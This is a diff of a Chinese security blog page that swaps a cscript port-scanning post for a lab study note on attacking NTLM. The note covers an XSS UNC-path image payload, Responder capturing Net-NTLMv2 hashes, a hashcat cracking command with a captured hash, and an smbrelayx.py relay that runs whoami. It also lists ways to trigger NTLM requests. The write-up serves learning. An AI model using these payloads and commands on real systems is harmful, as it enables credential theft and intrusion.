@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>利用cscript进行内网端口扫描 | CoolCat&#39; Blog</title>	
+<title>域渗透学习笔记三：攻击NTLM | CoolCat&#39; Blog</title>	
 
 <link rel="stylesheet" href="/styles/main.css">
 <script type="text/javascript">
@@ -64,7 +64,7 @@ window.onload=getCSS();
 			
 		<header id="header" class="site-header" 
 		
-		style="background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)),url(https://thekingofduck.github.io/post-images/scan-ports-by-cscript.png)"
+		style="background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)),url(https://thekingofduck.github.io/post-images/ADStudy-Part-3-Attack-NTLM.png)"
 		
 		>
 			<div class="site-branding">
@@ -154,10 +154,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">利用cscript进行内网端口扫描</h1>
+			<h1 class="wow swing entry-title">域渗透学习笔记三：攻击NTLM</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-02-28 21:06:54" itemprop="datePublished" pubdate="">2020-02-28</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-04 10:40:39" itemprop="datePublished" pubdate="">2020-03-04</time></i>
 	          </div>
 			
 </span>
@@ -165,33 +165,139 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p>Code:</p>
-<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582974509141.png" alt="" loading="lazy"></figure>
-<p>保存为xxx.vbs&gt;</p>
-<pre><code> cscript.exe this.vbs ip 80 or 80,123,445
+				<h3 id="基础知识">基础知识</h3>
+<p>最常见Pass The Hash 也就是Hash传递这一手法是就是利用Net-NTLM hash进行攻击的，仔细分析过Windows认证机制机制后会发现它就类似与一个web方面的重放攻击。</p>
+<p>比如：</p>
+<blockquote>
+<p>在一些条件下通过中间人抓到了站点登录后台登录时的Web流量，但是登录密码被前端加密了（比如MD5），hash值无法解密，这时候我们只需要重放这个登陆包就可以完成后台登录认证。</p>
+</blockquote>
+<p>在Net-NTLM认证过程中Net-NTLM hash传递发生在质询第二个包：</p>
+<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583251221865.png" alt="" loading="lazy"></figure>
+<p>里面最关键的字段是用户名以及Response。缺一不可，所以原则上来说进行Hash传递的条件有两:</p>
+<ul>
+<li>
+<p>抓到的Net-NTLM hash字段</p>
+</li>
+<li>
+<p>hash对应的用户名。</p>
+<p>个人不觉得能访问目标算条件，不能访问目标或者访问错误的目标想去搞Hash传递攻击本身就是个扯犊子的事情，就像Web重放一样，A站点的包你去重放给截然不同的B本身就很扯。关于协议版本对的上也是个人的总结，因为Net-NTLM协议在不同的版本上又可细分为NTLM v1，NTLMv2，NTLM session v2三种协议，不同协议使用不同格式的Challenge和加密算法。v1和v2在windows认证机制的学习中以及提到过其不同的地方。</p>
+</li>
+</ul>
+<h3 id="net-ntlm-hash窃取">Net-NTLM Hash窃取</h3>
+<p>相关Hash会出现三个地方：</p>
+<ul>
+<li>
+<p>SAM数据库</p>
+</li>
+<li>
+<p>Lsass进程</p>
+</li>
+<li>
+<p>传输过程</p>
+<p>前两点已经做过总结：<a href="https://blog.gzsec.org/post/Dumping-Windows-Local-Credentials-Tools/">Windows本地hashdump备忘录</a>, 各类之所以能够读到明文时因为去dump了lsass中缓存的用户输入得到明文，如果明文缓存不存在的情况下（比如2012/10以后系统wdigest默认没开启，明文不存在），读到的其实可以理解为都是NTLM hash。值得注意的是：</p>
+<ul>
+<li>Net-NTLM hash和NTLM hash不是一回事。</li>
+<li>Net-NTLM hash是Net-NTLM认证过程客户端第二次发送给服务端的包中的response字段。</li>
+</ul>
+</li>
+</ul>
+<p>了解完成就会明白Net-NTLM hash的窃取主要发生在传输环节，传输环节的攻击无非三个点。</p>
+<p>第一是传输前就截取到数据包，类似与Hook app的发包接口获取明文<br>
+第二是中间人攻击获取<br>
+第三是在接收方获取。</p>
+<p>第一个环节明显需要以及有对方能够控制底层流量权限，既然有了还搞啥Hash传递；第二个环节不少很了解，后续再学习；第三个环节需要接收方获取，通常情况下是控到刚好会被目标使用NILM认证访问的几率是很小的。不过可以伪造NTLM认证服务端，再配合其他漏洞进行利用。</p>
+<p>比如XSS：</p>
+<pre><code>&lt;img src=&quot;\\10.5.100.7\TheKingOfDuck.png&quot;&gt;
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582974824988.png" alt="" loading="lazy"></figure>
-<p>原生，动静小。</p>
-<p>适合防御严格的内网扫描。</p>
+<p>img标签是支持smb协议，然后smb协议本质上走的NTLM认证，NTLM认证在用户输入凭证前又会默认使用本地NTLM Hash先进行认证一遍，所以在无法Getshell的情况下，就可以伪造一个smb客户端，再通过该手法获取到Net-NTLM Hash，最后执行解密工作或hash传递攻击</p>
+<p><strong>Responder伪造认证服务端</strong>：</p>
+<p>伪造一个Net-NTLM协议认证服务端，当用户进行访问时系统默认会先将本地Net-NTLM hash进行验证，该hash可进行碰撞解密获取密码。</p>
+<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583305815079.png" alt="" loading="lazy"></figure>
+<p>在目标机器上访问伪造的客户端(可以是多种形式，比如上面说到的xss获取)</p>
+<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583305985478.png" alt="" loading="lazy"></figure>
+<p>获得Net-NTLM hash：</p>
+<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583306002981.png" alt="" loading="lazy"></figure>
+<p>同类工具还有<a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>,原理都是一样的</p>
+<h3 id="net-ntlm-hash-利用">Net-NTLM Hash 利用</h3>
+<p><strong>Net-NTLMv1 Hash加密策略远弱于v2，拿到Net-NTLM v1 hash就约等于NTLM HASH，v2在暴力破解不成功的情况下就可以考虑Relay攻击</strong></p>
+<h4 id="net-ntlm-v2-hash暴力破解">Net-NTLM v2 hash暴力破解</h4>
+<p>将Responder获取到的Net-NTLM hash交给hashcat进行暴力破解</p>
+<pre><code>hashcat -m 5600 attacker::ADSTUDY:1aef20d3cfba8772:9D01310D04E79AD84A789669BE40EF2C:0101000000000000D9C9E307FDF1D5014454D6B4C6B563920000000002000E0041004400530054005500440059000100060042004F0054000400160061006400730074007500640079002E0063006F006D0003001E0062006F0074002E0061006400730074007500640079002E0063006F006D000500160061006400730074007500640079002E0063006F006D0007000800D9C9E307FDF1D50106000400020000000800300030000000000000000000000000200000D6F78567C955B9EA05E044A994D2307E6DEF8486F2ECA33C9F042A0F501043C10A001000000000000000000000000000000000000900200063006900660073002F00310030002E0035002E003100300030002E0031003000000000000000000000000000 pass.txt --force
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583310530278.png" alt="" loading="lazy"></figure>
+<p>如图是暴力破解成功的情况。</p>
+<h4 id="net-ntlm-v2-hash-relay">Net-NTLM v2 hash Relay</h4>
+<p>以relay2smb为例：</p>
+<figure data-type="image" tabindex="6"><img src="https://camo.githubusercontent.com/ac10e8dc32ccc3ce85bc42d7b06472da2dfc0690/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303139303631333135333532383238332e706e673f782d6f73732d70726f636573733d696d6167652f77617465726d61726b2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c33647a4d544d784d6a6b3d2c73697a655f31362c636f6c6f725f4646464646462c745f3730" alt="" loading="lazy"></figure>
+<p>利用条件有两：</p>
+<ul>
+<li>
+<p>目标机器不能开启smb签名，否则利用无效,一般情况下,windows server会默认开启,而windows单机系统[win 7/8/8.1/10]默认都不会开。</p>
+</li>
+<li>
+<p>对一些打了ms08-068[KB957097]补丁的老系统[比如windows xp/2003以下的系统]利用无效。</p>
+<p><strong>值得一提的是域控默认开启smb签名的,其他默认没开</strong></p>
+<p>relay对象10.5.100.7 (win7)<br>
+攻击机10.5.100.10 （Kali）<br>
+relay到 10.5.100.1 （2012）</p>
+<p>在kali 使用nmap来检查签名是否开启，smbrelayx.py模块来发起relay攻击</p>
+<pre><code>nmap -Pn -sT -p 445 --open --script smb-security-mode,smb-os-discovery 10.5.100.7
+</code></pre>
+</li>
+</ul>
+<p><img src="https://thekingofduck.github.io/post-images/1583313947570.png" alt="" loading="lazy"><br>
+（message_signing: disabled 即可，Responder自带的Runfinger也可以，不用检查也可以，Multirelay也会自动检查的）</p>
+<p>在kali上开启relay</p>
+<pre><code>python smbrelayx.py -h 192.168.22.162 -c whoami
+</code></pre>
+<p>在2012上执行</p>
+<pre><code>dir \\10.5.100.10\C$
+</code></pre>
+<p>即可relay成功。</p>
+<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1583332013078.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1583332020524.png" alt="" loading="lazy"></figure>
+<h3 id="总结">总结</h3>
+<p>大多数情况攻击NTLM能成功都是因为NTLM在认证是默认会先使用本地hash去登录目标服务，因此可以制造各种机会去获取到Net-NTLM hash再进一步解密操作。</p>
+<ul>
+<li>
+<p>Net-NTLM v1 hash相对容易破解，拿到就约等于拿到了NTLM hash</p>
+</li>
+<li>
+<p>Net-NTLM v2 hash需要暴力破解</p>
+</li>
+<li>
+<p>NTLM-Relay 攻击的姿势很多，工具也多，msf/smbrelayx.py/Responder</p>
+</li>
+<li>
+<p>触发让系统发送NTLM请求的地方非常多。因为很多地方都支持UNC路径</p>
+</li>
+</ul>
+<p>比如：</p>
+<ul>
+<li>xss</li>
+<li>各种图标（desktop.ini,scf文件，用户头像）</li>
+<li>pdf/word</li>
+<li>outlook</li>
+<li>xxe/ssrf</li>
+<li>etc...</li>
+</ul>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
-				<a href="https://thekingofduck.github.io/tag/j1HUpRp1w/" rel="tag">cscript</a>	
+				<a href="https://thekingofduck.github.io/tag/gmpF7RbPK/" rel="tag">攻击NTLM</a>	
 				 
-				<a href="https://thekingofduck.github.io/tag/Fw__NPNK8i/" rel="tag">portscan</a>	
-				 
-				<a href="https://thekingofduck.github.io/tag/9kbi-GM-y2/" rel="tag">端口扫描</a>	
+				<a href="https://thekingofduck.github.io/tag/bNi_XRNGwr/" rel="tag">域渗透</a>	
 				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://thekingofduck.github.io/post/ADStudy-Part-1-AD-Install/" rel="prev"> 域渗透学习笔记一：域环境的搭建</a></div>
+		<div class="wow bounceInLeft nav-previous3"><a href="https://thekingofduck.github.io/post/ADStudy-Part-4-Kerbroes-Study/" rel="prev"> 域渗透学习笔记四：域认证机制Kerbroes刨析</a></div>
 		 
 		 
-		<div class="wow bounceInRight nav-next3"><a href="https://thekingofduck.github.io/post/CVE-2020-8840/" rel="next"> CVE-2020-8840复现</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://thekingofduck.github.io/post/ADStudy-Part-2-Net-NTLM-Study/" rel="next"> 域渗透学习笔记二：Windows认证机制Net-NTLM刨析</a></div>
 		
 		</div>
 	</nav>
